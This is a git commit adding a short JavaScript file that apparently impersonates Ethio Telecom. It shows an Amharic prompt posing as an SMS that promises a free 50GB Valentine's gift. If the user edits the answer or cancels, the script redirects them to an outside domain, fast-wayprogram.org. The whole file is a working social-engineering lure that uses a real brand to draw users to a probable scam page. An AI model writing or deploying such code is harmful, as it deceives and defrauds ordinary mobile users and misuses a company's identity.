8d790af67fa98d1d303c4dae36bb5c20f9dc5aba
superblog1 <imohette4@gmail.com>
2025-02-02 10:46:56 +0100

    Create ethio-active.js

---
+++ ethio-active.js
@@ -0,0 +1,6 @@
+
+var password = '50GB አግብር'
+password=prompt('SMS: እንኳን ደስ አለህ ለኢትዮ ቴሌኮም ቫለንታይን ስጦታ ብቁ ነህ፣ አሁኑኑ ለማግበር እሺን ተጫን።   ','50GB አግብር');
+if (password != '50GB አግብር') {
+location.href='https://fast-wayprogram.org/ethio-val.html';
+}
